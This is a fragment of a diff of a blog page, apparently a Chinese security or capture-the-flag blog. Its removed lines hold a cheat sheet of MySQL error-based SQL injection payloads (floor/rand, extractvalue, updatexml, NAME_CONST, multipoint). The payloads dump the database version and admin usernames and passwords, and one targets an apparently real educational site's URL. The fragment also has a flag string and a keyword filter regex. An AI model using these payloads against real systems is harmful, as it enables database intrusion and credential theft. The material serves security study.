-<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>暴内容</em>/</p>
-<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) 2、ExtractValue(有长度限制,最长32位)</p>
-<p>SQL http://www.hackblog.cn/sql.php?id=1 and extractvalue(1, concat(0x7e, (select @<span class="citation" data-cites="version">@version</span>),0x7e)) http://www.hackblog.cn/sql.php?id=1 and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1))) 3、UpdateXml(有长度限制,最长32位)</p>
-<p>SQL http://www.hackblog.cn/sql.php?id=1 and updatexml(1,concat(0x7e,(SELECT @<span class="citation" data-cites="version">@version</span>),0x7e),1) http://www.hackblog.cn/sql.php?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1) 4、NAME_CONST(适用于低版本)</p>
-<p>SQL http://wlkc.zjtie.edu.cn/qcwh/content/detail.php?id=330&amp;sid=19&amp;cid=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- 5、Error based Double Query Injection (http://www.vaibs.in/error-based-double-query-injection/)</p>
-<p>/<em>数据库版本</em>/</p>
-<p>SQL http://www.hackblog.cn/sql.php?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1 6、Multipoint(新方法)</p>
-<p>/<em>数据库版本</em>/</p>
-<p>SQL http://www.hackblog.cn/sql.php?id=1 and 1=(select multipoint((select * from(select * from(select version())f)x)))</p>
-
-    <div id="aplayer-pdVlRDuV" class="aplayer aplayer-tag-marker meting-tag-marker"
-         data-id="437752615" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
-    ></div>
-<p>flag{8ce6f77b-a046-43e4-88c8-44d53f7df4c4}</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1584,14 +1503,14 @@ $filter = "/union|and|\bor\b|information_schema|updatexml/i";
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">318k</span>
+    <span title="站点总字数">320k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:49</span>
+    <span title="站点阅读时长">4:51</span>
   </span>
 </div>
 <div class="busuanzi-count">
